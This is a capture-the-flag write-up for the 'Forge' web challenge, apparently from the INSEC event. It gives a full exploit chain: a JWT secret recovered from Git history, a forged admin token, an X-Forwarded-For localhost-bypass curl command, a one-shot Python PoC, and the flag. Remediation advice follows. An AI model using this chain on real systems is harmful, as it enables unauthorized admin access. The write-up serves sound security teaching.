# Forge (500) - Web Challenge Writeup

## Challenge Information
- Category: Web
- Name: Forge
- Author: siegward
- Difficulty: 500
- Target: http://challs.insec.club:40010
- Rule: Bruteforcing is prohibited

## Executive Summary
This challenge is solved through a clean two-bug chain:
1. JWT signing secret disclosure in Git history.
2. Localhost-only admin control bypass by spoofing `X-Forwarded-For`.

Using the leaked secret, we forge an admin JWT (`role=admin`).
Using a spoofed `X-Forwarded-For: 127.0.0.1`, we bypass the IP gate on `/admin`.
The admin panel then discloses the flag directly in the `role` field of the `flag` account.

Final flag:

```text
INSEC{yE4h_jusT_T1Me_trAv3L_aLRIGht}
```

## Professional Methodology
- Reconnaissance
- Enumeration
- Vulnerability Discovery
- Exploitation
- Validation
- Reporting and Remediation

## 1) Reconnaissance
Initial endpoint mapping from source and behavior:
- `GET /login`
- `GET /register`
- `GET /profil`
- `GET /admin`
- `POST /api/v1/register`
- `POST /api/v1/process_login`

Technology identified:
- Flask + SQLite
- JWT (HS256) in `token` cookie
- Role-based rendering in templates

## 2) Attack Surface and Trust Boundaries
Primary trust boundaries:
1. Client-controlled cookie JWT (`token`) used for authorization decisions.
2. Client-controlled `X-Forwarded-For` header used for admin IP filtering.
3. Sensitive value (flag) stored in DB as role data and rendered to admin panel.

Critical logic in `app.py`:
- `/admin` uses `request.headers.get('X-Forwarded-For', request.remote_addr)`.
- Access allowed if that value equals `127.0.0.1`.
- JWT is decoded and only `role == 'admin'` is required.
- Admin page queries `username, role` for users `flag` and `admin`.
- During DB init, `flag` user's `role` is set to the actual flag.

## 3) Vulnerability Discovery

### Finding 1: Secret Exposure via Git History (High)
The JWT secret was removed from the working tree, but remained accessible in commit history.

Recovered with:

```bash
git show 9253f97:.env
```

Recovered value:

```text
JWT_SECRET="ZXZlcnl0aGluZ2luaXRzcmlnaHRwbGFjZS02MTZFNzQ2OTYyNzI3NTc0NjU2NjZGNzI2MzY1"
```

Security issue:
- Secret rotation/removal was incomplete.
- Historic commits remained a valid source of production-equivalent credentials.

### Finding 2: Broken Access Control via Header Spoofing (Critical)
`/admin` performs localhost restriction using `X-Forwarded-For` directly.

Why this is exploitable:
- `X-Forwarded-For` is user-supplied unless a trusted reverse proxy strips/sets it.
- An attacker can send `X-Forwarded-For: 127.0.0.1` and satisfy the IP check.

### Finding 3: Sensitive Data Exposure in Admin View (High)
The application stores the flag as the `role` value for user `flag` and renders that field in the admin table.

Impact:
- Any successful admin access equals immediate flag disclosure.

## 4) Exploitation Chain

### Step A: Recover JWT Secret

```bash
cd forge/forge
git show 9253f97:.env
```

### Step B: Forge Admin JWT

```python
import jwt

secret = "ZXZlcnl0aGluZ2luaXRzcmlnaHRwbGFjZS02MTZFNzQ2OTYyNzI3NTc0NjU2NjZGNzI2MzY1"
token = jwt.encode({"username": "admin", "role": "admin"}, secret, algorithm="HS256")
print(token)
```

### Step C: Bypass Localhost Restriction and Read Flag

```bash
curl -s \
  -H "X-Forwarded-For: 127.0.0.1" \
  -b "token=<FORGED_JWT>" \
  http://challs.insec.club:40010/admin
```

The response contains:

```text
INSEC{yE4h_jusT_T1Me_trAv3L_aLRIGht}
```

## 5) One-Shot PoC (Reproducible)

```python
#!/usr/bin/env python3
import re
import jwt
import requests

BASE = "http://challs.insec.club:40010"
SECRET = "ZXZlcnl0aGluZ2luaXRzcmlnaHRwbGFjZS02MTZFNzQ2OTYyNzI3NTc0NjU2NjZGNzI2MzY1"


def main():
    forged = jwt.encode(
        {"username": "admin", "role": "admin"},
        SECRET,
        algorithm="HS256",
    )

    r = requests.get(
        f"{BASE}/admin",
        headers={"X-Forwarded-For": "127.0.0.1"},
        cookies={"token": forged},
        timeout=15,
    )

    print(f"[+] HTTP status: {r.status_code}")
    m = re.search(r"INSEC\{[^}]+\}", r.text)
    if m:
        print(f"[+] Flag: {m.group(0)}")
    else:
        print("[-] Flag not found in response")


if __name__ == "__main__":
    main()
```

Expected output:

```text
[+] HTTP status: 200
[+] Flag: INSEC{yE4h_jusT_T1Me_trAv3L_aLRIGht}
```

## 6) Severity and Business Impact

Suggested severity: Critical

Reasoning:
- Authentication/authorization controls are bypassed.
- Privileged interface access is achieved remotely.
- Sensitive data is disclosed immediately after bypass.

Approximate CVSS v3.1 vector:

```text
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N  (8.2)
```

## 7) Root Cause
- Secrets were committed and remained retrievable in VCS history.
- The application trusted an untrusted header as an authentication factor.
- Authorization relied on client token claims without stronger server-side controls.
- Sensitive data (flag) was placed in a field rendered to users with admin UI access.

## 8) Remediation
1. Never trust raw `X-Forwarded-For` from clients.
2. Enforce trusted proxy configuration (set and verify proxy chain).
3. Rotate JWT secrets immediately after exposure.
4. Purge secrets from Git history and enforce secret scanning in CI.
5. Validate roles server-side from DB/session, not only from JWT claims.
6. Add JWT hardening (`exp`, `iat`, `aud`, `iss`, key rotation).
7. Avoid storing sensitive secrets in generic display fields.

## 9) Key Lessons
- Deleting a secret from the latest commit is not remediation.
- Header-based origin controls are fragile unless backed by trusted infrastructure.
- Small misconfigurations can chain into full compromise.

## Conclusion
The challenge demonstrates a realistic and high-impact exploit chain combining credential leakage and broken access control. No brute force was needed; the compromise was deterministic and fully reproducible.
